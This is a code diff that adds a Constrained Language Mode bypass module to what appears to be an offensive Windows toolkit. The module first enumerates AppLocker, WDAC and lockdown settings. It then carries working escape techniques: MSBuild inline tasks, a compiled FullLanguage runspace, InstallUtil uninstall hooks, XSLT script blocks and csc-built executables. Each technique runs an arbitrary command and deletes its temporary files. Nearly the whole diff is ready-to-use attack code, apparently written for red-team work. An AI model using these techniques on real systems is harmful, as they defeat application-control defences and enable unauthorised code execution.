@@ -22260,6 +22260,465 @@ Write-Output "[+] Monitor '${name}' removed successfully"
   return { output: output.join("\n"), findings }
 }
 
+async function clmBypass(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const method = argVal(args, "--method") || "runspace"
+  const command = argVal(args, "--command")
+  const scriptPath = argVal(args, "--script-path")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Constrained Language Mode (CLM) bypass...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== PowerShell Language Mode Assessment ==="
+Write-Output ""
+
+# Current language mode
+$langMode = $ExecutionContext.SessionState.LanguageMode
+Write-Output "Current Language Mode: $langMode"
+Write-Output "LANG_MODE=$langMode"
+Write-Output ""
+
+# Check if CLM is enforced
+if ($langMode -eq 'ConstrainedLanguage') {
+  Write-Output "[!] Constrained Language Mode is ACTIVE"
+  Write-Output "[*] Restrictions:"
+  Write-Output "    - No Add-Type (cannot compile C#)"
+  Write-Output "    - No New-Object for COM objects"
+  Write-Output "    - No .NET framework classes directly"
+  Write-Output "    - No script blocks in variables"
+  Write-Output "    - Only approved cmdlets and functions"
+  Write-Output ""
+} elseif ($langMode -eq 'FullLanguage') {
+  Write-Output "[+] FullLanguage mode — no CLM bypass needed"
+  Write-Output ""
+}
+
+# Check what enforces CLM
+Write-Output "=== CLM Enforcement Sources ==="
+
+# AppLocker
+$appLocker = Get-ChildItem 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2' -ErrorAction SilentlyContinue
+if ($appLocker) {
+  Write-Output "[*] AppLocker policies detected"
+  foreach ($rule in $appLocker) {
+    $ruleCount = (Get-ChildItem $rule.PSPath -ErrorAction SilentlyContinue | Measure-Object).Count
+    Write-Output "    $($rule.PSChildName): $ruleCount rules"
+  }
+  Write-Output "APPLOCKER=1"
+} else {
+  Write-Output "[*] No AppLocker policies"
+  Write-Output "APPLOCKER=0"
+}
+
+# WDAC (Windows Defender Application Control)
+$wdac = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue
+if ($wdac -and $wdac.CodeIntegrityPolicyEnforcementStatus -gt 0) {
+  Write-Output "[*] WDAC/Code Integrity policy active (enforcement: $($wdac.CodeIntegrityPolicyEnforcementStatus))"
+  Write-Output "WDAC=1"
+} else {
+  Write-Output "[*] No WDAC enforcement"
+  Write-Output "WDAC=0"
+}
+
+# __PSLockdownPolicy (system-wide CLM)
+$lockdown = [Environment]::GetEnvironmentVariable('__PSLockdownPolicy', 'Machine')
+if ($lockdown) {
+  Write-Output "[*] __PSLockdownPolicy set: $lockdown"
+  Write-Output "    Value 4 = ConstrainedLanguage enforced"
+  Write-Output "LOCKDOWN=$lockdown"
+} else {
+  Write-Output "[*] __PSLockdownPolicy not set"
+  Write-Output "LOCKDOWN=0"
+}
+
+# PowerShell version check (PS2 bypass availability)
+Write-Output ""
+Write-Output "=== Bypass Method Availability ==="
+$ps2 = (Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction SilentlyContinue).State
+Write-Output "PS 2.0 Engine: $(if ($ps2 -eq 'Enabled') { 'AVAILABLE (use ps_downgrade)' } else { 'DISABLED' })"
+
+# MSBuild check
+$msbuild = Get-Command MSBuild.exe -ErrorAction SilentlyContinue
+if (-not $msbuild) {
+  $msbuild = Get-Item "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe" -ErrorAction SilentlyContinue
+}
+Write-Output "MSBuild: $(if ($msbuild) { $msbuild.Source ?? $msbuild.FullName } else { 'NOT FOUND' })"
+Write-Output "MSBUILD=$(if ($msbuild) { '1' } else { '0' })"
+
+# InstallUtil check
+$installUtil = Get-Item "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe" -ErrorAction SilentlyContinue
+Write-Output "InstallUtil: $(if ($installUtil) { $installUtil.FullName } else { 'NOT FOUND' })"
+Write-Output "INSTALLUTIL=$(if ($installUtil) { '1' } else { '0' })"
+
+# csc.exe (C# compiler)
+$csc = Get-Item "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" -ErrorAction SilentlyContinue
+Write-Output "csc.exe: $(if ($csc) { $csc.FullName } else { 'NOT FOUND' })"
+Write-Output "CSC=$(if ($csc) { '1' } else { '0' })"
+
+# pwsh.exe (PS7 may have different CLM config)
+$pwsh = Get-Command pwsh -ErrorAction SilentlyContinue
+Write-Output "pwsh.exe (PS7): $(if ($pwsh) { 'AVAILABLE — may have different CLM config' } else { 'NOT FOUND' })"
+Write-Output "PWSH=$(if ($pwsh) { '1' } else { '0' })"
+
+# xslt support
+Write-Output "XSLT: Available (built-in .NET)"
+Write-Output ""
+
+Write-Output "=== Recommended Bypass Methods ==="
+if ($langMode -eq 'ConstrainedLanguage') {
+  Write-Output "  1. runspace  — Custom .NET runspace (needs csc.exe or Add-Type workaround)"
+  if ($msbuild) { Write-Output "  2. msbuild   — MSBuild inline task (RECOMMENDED — usually not blocked)" }
+  if ($installUtil) { Write-Output "  3. installutil — InstallUtil /LogToConsole=false" }
+  Write-Output "  4. xslt     — XSL Transform with embedded C#"
+  Write-Output "  5. addtype  — Add-Type via temp file compilation"
+} else {
+  Write-Output "  No bypass needed — FullLanguage mode active"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const langMode = r.stdout.match(/LANG_MODE=(\w+)/)
+    if (langMode && langMode[1] === "ConstrainedLanguage") {
+      const hasMSBuild = r.stdout.includes("MSBUILD=1")
+      findings.push({
+        checkId: "WIN-CLM-001",
+        provider: "windows",
+        severity: "high",
+        status: "CONSTRAINED",
+        resource: "powershell://language-mode",
+        title: "PowerShell Constrained Language Mode active",
+        details: `CLM restricts Add-Type, New-Object COM, .NET classes. ${hasMSBuild ? "MSBuild available for bypass." : "Check available bypass methods."}`,
+        remediation: "Use clm_bypass --action bypass to escape CLM restrictions.",
+      })
+    }
+  }
+
+  if (action === "bypass" || action === "execute") {
+    const cmdToRun = command || "whoami /all"
+
+    if (method === "msbuild") {
+      const script = `
+Write-Output "=== CLM Bypass via MSBuild Inline Task ==="
+Write-Output ""
+
+$msbuildPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
+if (-not (Test-Path $msbuildPath)) {
+  $msbuildPath = (Get-Command MSBuild.exe -ErrorAction SilentlyContinue).Source
+}
+if (-not $msbuildPath) {
+  Write-Output "[-] MSBuild.exe not found"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+Write-Output "[*] MSBuild: $msbuildPath"
+
+# Create MSBuild project with inline task
+$projPath = "$env:TEMP\\cs-build-$(Get-Random -Max 9999).csproj"
+$projContent = @"
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="CS">
+    <CSTask />
+  </Target>
+  <UsingTask TaskName="CSTask" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+using System;
+using System.Diagnostics;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+public class CSTask : Task {
+  public override bool Execute() {
+    var p = new Process();
+    p.StartInfo.FileName = "powershell.exe";
+    p.StartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \\"$ExecutionContext.SessionState.LanguageMode; ${cmdToRun.replace(/"/g, '\\"').replace(/\\/g, "\\\\")}\\";
+    p.StartInfo.UseShellExecute = false;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.StartInfo.RedirectStandardError = true;
+    p.Start();
+    Console.Write(p.StandardOutput.ReadToEnd());
+    Console.Write(p.StandardError.ReadToEnd());
+    p.WaitForExit();
+    return true;
+  }
+}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+"@
+
+[System.IO.File]::WriteAllText($projPath, $projContent)
+Write-Output "[+] Project file: $projPath"
+Write-Output "[*] Executing via MSBuild..."
+Write-Output ""
+
+$result = & $msbuildPath $projPath /nologo /verbosity:quiet 2>&1
+Write-Output $result
+Write-Output ""
+
+# Cleanup
+Remove-Item $projPath -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Project file cleaned up"
+Write-Output "STATUS=SUCCESS"
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (method === "runspace") {
+      const script = `
+Write-Output "=== CLM Bypass via Custom .NET Runspace ==="
+Write-Output ""
+
+# Compile a small C# helper that creates a FullLanguage runspace
+$cscPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
+if (-not (Test-Path $cscPath)) {
+  Write-Output "[-] csc.exe not found — try msbuild method instead"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+$csPath = "$env:TEMP\\cs-rs-$(Get-Random -Max 9999).cs"
+$exePath = "$env:TEMP\\cs-rs-$(Get-Random -Max 9999).exe"
+
+$csCode = @"
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+class P {
+  static void Main(string[] args) {
+    var rs = RunspaceFactory.CreateRunspace();
+    rs.Open();
+    var ps = PowerShell.Create();
+    ps.Runspace = rs;
+    ps.AddScript(string.Join(" ", args));
+    foreach (var r in ps.Invoke()) Console.WriteLine(r);
+    foreach (var e in ps.Streams.Error) Console.Error.WriteLine(e);
+    rs.Close();
+  }
+}
+"@
+
+[System.IO.File]::WriteAllText($csPath, $csCode)
+Write-Output "[*] Compiling runspace helper..."
+
+$smaPath = [System.Management.Automation.PSObject].Assembly.Location
+$result = & $cscPath /nologo /target:exe /reference:"$smaPath" /out:"$exePath" "$csPath" 2>&1
+if (Test-Path $exePath) {
+  Write-Output "[+] Compiled: $exePath"
+  Write-Output "[*] Executing in FullLanguage runspace..."
+  Write-Output ""
+  $output = & $exePath "${cmdToRun}" 2>&1
+  Write-Output $output
+  Write-Output ""
+  Remove-Item $exePath, $csPath -Force -ErrorAction SilentlyContinue
+  Write-Output "[+] Cleaned up"
+  Write-Output "STATUS=SUCCESS"
+} else {
+  Write-Output "[-] Compilation failed:"
+  Write-Output $result
+  Remove-Item $csPath -Force -ErrorAction SilentlyContinue
+  Write-Output "STATUS=FAILED"
+}
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (method === "installutil") {
+      const script = `
+Write-Output "=== CLM Bypass via InstallUtil ==="
+Write-Output ""
+
+$installUtilPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"
+$cscPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
+
+if (-not (Test-Path $installUtilPath) -or -not (Test-Path $cscPath)) {
+  Write-Output "[-] InstallUtil or csc.exe not found"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+$csPath = "$env:TEMP\\cs-iu-$(Get-Random -Max 9999).cs"
+$dllPath = "$env:TEMP\\cs-iu-$(Get-Random -Max 9999).dll"
+
+$csCode = @"
+using System;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Configuration.Install;
+[RunInstaller(true)]
+public class Bypass : Installer {
+  public override void Uninstall(System.Collections.IDictionary s) {
+    var p = new Process();
+    p.StartInfo.FileName = "powershell.exe";
+    p.StartInfo.Arguments = "-NoProfile -Command \\"${cmdToRun.replace(/"/g, '\\"').replace(/\\/g, "\\\\")}\\";
+    p.StartInfo.UseShellExecute = false;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.Start();
+    Console.Write(p.StandardOutput.ReadToEnd());
+    p.WaitForExit();
+  }
+}
+"@
+
+[System.IO.File]::WriteAllText($csPath, $csCode)
+& $cscPath /nologo /target:library /out:"$dllPath" "$csPath" 2>&1 | Out-Null
+
+if (Test-Path $dllPath) {
+  Write-Output "[+] Compiled: $dllPath"
+  Write-Output "[*] Executing via InstallUtil /U (Uninstall)..."
+  Write-Output ""
+  $result = & $installUtilPath /LogToConsole=false /U "$dllPath" 2>&1
+  Write-Output $result
+  Remove-Item $dllPath, $csPath -Force -ErrorAction SilentlyContinue
+  Write-Output ""
+  Write-Output "[+] Cleaned up"
+  Write-Output "STATUS=SUCCESS"
+} else {
+  Write-Output "[-] Compilation failed"
+  Remove-Item $csPath -Force -ErrorAction SilentlyContinue
+  Write-Output "STATUS=FAILED"
+}
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (method === "xslt") {
+      const script = `
+Write-Output "=== CLM Bypass via XSLT Transform ==="
+Write-Output ""
+
+$xslPath = "$env:TEMP\\cs-xsl-$(Get-Random -Max 9999).xsl"
+$xmlPath = "$env:TEMP\\cs-xsl-$(Get-Random -Max 9999).xml"
+
+$xmlContent = '<?xml version="1.0"?><data></data>'
+$xslContent = @"
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+  xmlns:cs="urn:cs">
+  <msxsl:script language="C#" implements-prefix="cs">
+    public string Exec(string cmd) {
+      var p = new System.Diagnostics.Process();
+      p.StartInfo.FileName = "powershell.exe";
+      p.StartInfo.Arguments = "-NoProfile -Command \\"" + cmd + "\\"";
+      p.StartInfo.UseShellExecute = false;
+      p.StartInfo.RedirectStandardOutput = true;
+      p.Start();
+      string o = p.StandardOutput.ReadToEnd();
+      p.WaitForExit();
+      return o;
+    }
+  </msxsl:script>
+  <xsl:template match="/">
+    <xsl:value-of select="cs:Exec('${cmdToRun.replace(/'/g, "''")}')" />
+  </xsl:template>
+</xsl:stylesheet>
+"@
+
+[System.IO.File]::WriteAllText($xmlPath, $xmlContent)
+[System.IO.File]::WriteAllText($xslPath, $xslContent)
+Write-Output "[+] XSL transform file: $xslPath"
+Write-Output "[*] Executing..."
+Write-Output ""
+
+try {
+  $xslt = New-Object System.Xml.Xsl.XslCompiledTransform
+  $settings = New-Object System.Xml.Xsl.XsltSettings
+  $settings.EnableScript = $true
+  $xslt.Load($xslPath, $settings, $null)
+  $sw = New-Object System.IO.StringWriter
+  $xslt.Transform($xmlPath, $null, $sw)
+  Write-Output $sw.ToString()
+  Write-Output "STATUS=SUCCESS"
+} catch {
+  Write-Output "[-] XSLT execution failed: $_"
+  Write-Output "[*] CLM may block XslCompiledTransform — try msbuild method"
+  Write-Output "STATUS=FAILED"
+}
+
+Remove-Item $xslPath, $xmlPath -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Cleaned up"
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (method === "addtype") {
+      const script = `
+Write-Output "=== CLM Bypass via Add-Type (temp file) ==="
+Write-Output ""
+Write-Output "[*] Note: Add-Type is normally blocked in CLM"
+Write-Output "[*] This uses a file-based compilation workaround"
+Write-Output ""
+
+$cscPath = "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
+$csPath = "$env:TEMP\\cs-at-$(Get-Random -Max 9999).cs"
+$exePath = "$env:TEMP\\cs-at-$(Get-Random -Max 9999).exe"
+
+$code = @"
+using System;
+using System.Diagnostics;
+class P {
+  static void Main() {
+    var p = Process.Start(new ProcessStartInfo {
+      FileName = "powershell.exe",
+      Arguments = "-NoProfile -Command \\"${cmdToRun.replace(/"/g, '\\"').replace(/\\/g, "\\\\")}\\",
+      UseShellExecute = false,
+      RedirectStandardOutput = true
+    });
+    Console.Write(p.StandardOutput.ReadToEnd());
+    p.WaitForExit();
+  }
+}
+"@
+
+[System.IO.File]::WriteAllText($csPath, $code)
+$result = & $cscPath /nologo /target:exe /out:"$exePath" "$csPath" 2>&1
+if (Test-Path $exePath) {
+  Write-Output "[+] Compiled standalone EXE"
+  Write-Output "[*] Executing..."
+  Write-Output ""
+  & $exePath 2>&1
+  Remove-Item $exePath, $csPath -Force -ErrorAction SilentlyContinue
+  Write-Output ""
+  Write-Output "[+] Cleaned up"
+  Write-Output "STATUS=SUCCESS"
+} else {
+  Write-Output "[-] Compilation failed: $result"
+  Remove-Item $csPath -Force -ErrorAction SilentlyContinue
+  Write-Output "STATUS=FAILED"
+}
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    const succeeded = output.some(o => o.includes("STATUS=SUCCESS"))
+    if (succeeded) {
+      findings.push({
+        checkId: "WIN-CLM-010",
+        provider: "windows",
+        severity: "critical",
+        status: "BYPASSED",
+        resource: `powershell://clm-bypass/${method}`,
+        title: `CLM bypassed via ${method} — FullLanguage code execution achieved`,
+        details: `Constrained Language Mode was bypassed using ${method}. Arbitrary PowerShell/C# code can now be executed.`,
+        remediation: `Block ${method} execution via WDAC policy or remove .NET build tools.`,
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -25896,6 +26355,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   silver_saml: silverSaml,
   rdp_shadow: rdpShadow,
   print_monitor_persist: printMonitorPersist,
+  clm_bypass: clmBypass,
 }
 
 export const WinhookTool = Tool.define("winhook", {
